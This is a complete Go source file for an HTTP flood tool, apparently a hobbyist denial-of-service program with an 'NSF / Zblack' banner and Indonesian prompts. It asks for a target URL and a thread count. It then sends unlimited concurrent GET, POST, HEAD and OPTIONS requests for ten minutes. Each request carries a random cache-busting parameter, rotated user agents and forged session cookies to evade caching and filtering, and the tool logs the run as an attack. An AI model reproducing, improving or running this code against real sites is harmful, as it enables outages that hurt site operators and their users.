package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"unicode/utf8"

	"github.com/sirupsen/logrus"
	"golang.org/x/term"
)

// ---------- Pre‑computed random pools ----------
const (
	urlSuffixLen = 8
	cookieLen    = 32
	poolSize     = 10000
)

var (
	urlSuffixPool []string
	cookiePool    []string
	uaPool        []string
	verboseMode   bool
)

func initPools(ua []string) {
	uaPool = ua
	src := rand.NewSource(time.Now().UnixNano())
	r := rand.New(src)

	urlSuffixPool = make([]string, poolSize)
	cookiePool = make([]string, poolSize)

	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	for i := 0; i < poolSize; i++ {
		b := make([]byte, urlSuffixLen)
		for j := range b {
			b[j] = chars[r.Intn(len(chars))]
		}
		urlSuffixPool[i] = string(b)
	}
	for i := 0; i < poolSize; i++ {
		b := make([]byte, cookieLen)
		for j := range b {
			b[j] = chars[r.Intn(len(chars))]
		}
		cookiePool[i] = string(b)
	}
}

// Atomic counter for pool rotation
var poolIdx uint64

func nextURLSuffix() string {
	idx := atomic.AddUint64(&poolIdx, 1) % poolSize
	return urlSuffixPool[idx]
}
func nextCookie() string {
	idx := atomic.AddUint64(&poolIdx, 1) % poolSize
	return cookiePool[idx]
}
func nextUA() string {
	idx := atomic.AddUint64(&poolIdx, 1) % uint64(len(uaPool))
	return uaPool[idx]
}

// ---------- Statistics ----------
type requestStats struct {
	success int64
	failure int64
}

func (s *requestStats) add(success, failure int64) {
	atomic.AddInt64(&s.success, success)
	atomic.AddInt64(&s.failure, failure)
}
func (s *requestStats) load() (int64, int64) {
	return atomic.LoadInt64(&s.success), atomic.LoadInt64(&s.failure)
}

// ---------- Single shared HTTP client ----------
var sharedClient *http.Client

func createSharedClient() *http.Client {
	transport := &http.Transport{
		Proxy:                 http.ProxyFromEnvironment,
		DialContext:           (&net.Dialer{Timeout: 10 * time.Second, KeepAlive: 90 * time.Second, DualStack: true}).DialContext,
		MaxIdleConns:          0,     // no limit
		MaxIdleConnsPerHost:   10000, // large pool
		MaxConnsPerHost:       0,     // no limit
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DisableKeepAlives:     false,
		DisableCompression:    true, // reduce CPU
		ForceAttemptHTTP2:     true,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

// ---------- Worker ----------
func sendRequest(
	ctx context.Context,
	workerID int,
	targetPrefix string,
	stats *requestStats,
	_ *logrus.Logger,
	wg *sync.WaitGroup,
) {
	defer wg.Done()

	methods := []string{"GET", "POST", "HEAD", "OPTIONS"}
	localSuccess, localFailure := int64(0), int64(0)
	flushEvery := int64(1000) // flush less often

	flush := func() {
		if localSuccess != 0 || localFailure != 0 {
			stats.add(localSuccess, localFailure)
			localSuccess, localFailure = 0, 0
		}
	}
	defer flush()

	for {
		if ctx.Err() != nil {
			return
		}

		method := methods[workerID%4] // deterministic mix per worker to avoid sync
		fullURL := targetPrefix + nextURLSuffix()

		req, err := http.NewRequestWithContext(ctx, method, fullURL, nil)
		if err != nil {
			localFailure++
			continue
		}

		req.Header.Set("User-Agent", nextUA())
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("X-Requested-With", "XMLHttpRequest")
		req.Header.Set("Cookie", "session="+nextCookie()+"; visitor="+nextCookie())

		resp, err := sharedClient.Do(req)
		if err != nil {
			localFailure++
			if localSuccess+localFailure >= flushEvery {
				flush()
			}
			continue
		}

		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			localSuccess++
		} else {
			localFailure++
		}

		if localSuccess+localFailure >= flushEvery {
			flush()
		}
	}
}

// ---------- Monitor ----------
func monitorProgress(ctx context.Context, log *logrus.Logger, stats *requestStats) {
	interval := 1 * time.Second
	if verboseMode {
		interval = 2 * time.Second
	}
	
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	var prevSuccess, prevFailure int64
	for {
		select {
		case <-ctx.Done():
			totalSuccess, totalFailure := stats.load()
			log.WithFields(logrus.Fields{
				"success_total":  totalSuccess,
				"failure_total":  totalFailure,
				"requests_total": totalSuccess + totalFailure,
			}).Info("Monitor stopped")
			return
		case <-ticker.C:
			totalSuccess, totalFailure := stats.load()
			deltaS := totalSuccess - prevSuccess
			deltaF := totalFailure - prevFailure
			prevSuccess, prevFailure = totalSuccess, totalFailure

			if deltaS == 0 && deltaF == 0 {
				if verboseMode {
					// In verbose mode, always log even if zero activity
					log.WithFields(logrus.Fields{
						"success_rps":  deltaS,
						"failure_rps":  deltaF,
						"requests_rps": deltaS + deltaF,
					}).Info("Throughput")
				}
				continue
			}
			log.WithFields(logrus.Fields{
				"success_rps":  deltaS,
				"failure_rps":  deltaF,
				"requests_rps": deltaS + deltaF,
			}).Info("Throughput")
		}
	}
}

// ---------- Worker pool orchestrator ----------
func workerPool(ctx context.Context, numWorkers int, targetURL string, log *logrus.Logger, userAgents []string) {
	_, err := url.Parse(targetURL)
	if err != nil {
		log.WithError(err).Fatal("Invalid URL")
	}
	requestPrefix := targetURL
	if strings.Contains(targetURL, "?") {
		requestPrefix += "&rand="
	} else {
		requestPrefix += "?rand="
	}

	initPools(userAgents)
	sharedClient = createSharedClient()

	stats := &requestStats{}
	var wg sync.WaitGroup

	derivedCtx, cancel := context.WithCancel(ctx)
	defer cancel()

	go monitorProgress(derivedCtx, log, stats)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go sendRequest(derivedCtx, i, requestPrefix, stats, log, &wg)
	}

	wg.Wait()
	cancel()

	totalS, totalF := stats.load()
	log.WithFields(logrus.Fields{
		"success_total":  totalS,
		"failure_total":  totalF,
		"requests_total": totalS + totalF,
	}).Info("All workers done")
}

// ---------- Helpers (unchanged from original) ----------
func loadUserAgents(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ua []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			ua = append(ua, line)
		}
	}
	return ua, scanner.Err()
}

func promptUserInput(promptText string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(promptText)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func printBanner() {

	banner := `
█████████████████████
█▄─▀█▄─▄█─▄▄▄▄█▄─▄▄─█
██─█▄▀─██▄▄▄▄─██─▄███
▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▄▄▄▀▀▀
v.1.0`

	termWidth, _, err := term.GetSize(int(os.Stdout.Fd()))
	if err != nil || termWidth <= 0 {
		termWidth = 80
	}

	maxRuneLen := 0
	for _, line := range strings.Split(banner, "\n") {
		if l := utf8.RuneCountInString(line); l > maxRuneLen {
			maxRuneLen = l
		}
	}

	for _, line := range strings.Split(banner, "\n") {
		if termWidth > maxRuneLen {
			padding := strings.Repeat(" ", (termWidth-maxRuneLen)/2)
			fmt.Println(padding + line)
		} else {
			fmt.Println(line)
		}
	}
}

// ---------- Custom formatter ----------
type ListFormatter struct{}

func (f *ListFormatter) Format(entry *logrus.Entry) ([]byte, error) {
	return []byte(fmt.Sprintf("[%s] %s\n", entry.Time.Format("2006-01-02 15:04:05"), entry.Message)), nil
}

// ---------- Main ----------
func main() {

	printBanner()
	fmt.Println("======+ NSF +======")
	fmt.Println("====+ Zblack +====")
	fmt.Println()

	// Parse command-line flags
	flag.BoolVar(&verboseMode, "verbose", false, "Enable verbose logging (logs every 2 seconds)")
	flag.Parse()

	log := logrus.New()
	log.SetFormatter(&ListFormatter{})
	log.SetOutput(os.Stdout)
	log.SetLevel(logrus.InfoLevel)

	if verboseMode {
		log.Info("Verbose mode enabled - logs every 2 seconds")
	}

	targetURL := promptUserInput("target URL: ")
	if targetURL == "" {
		log.Fatal("masukan url dg benar")
	}

	threadsInput := promptUserInput("threads: ")
	numThreads, err := strconv.Atoi(strings.TrimSpace(threadsInput))
	if err != nil || numThreads <= 0 {
		log.Fatal("threads salah")
	}

	userAgentFile := "user_agents.txt"
	userAgents, err := loadUserAgents(userAgentFile)
	if err != nil {
		log.WithError(err).Fatal("tidak ditemukan file user_agents.txt")
	}
	if len(userAgents) == 0 {
		log.Fatal("user agent list kosong")
	}

	log.WithFields(logrus.Fields{
		"url":        targetURL,
		"threads":    numThreads,
		"userAgents": len(userAgents),
	}).Info("Starting max-throughput flood")

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()

	workerPool(ctx, numThreads, targetURL, log, userAgents)
	log.Info("Attack finished")
}
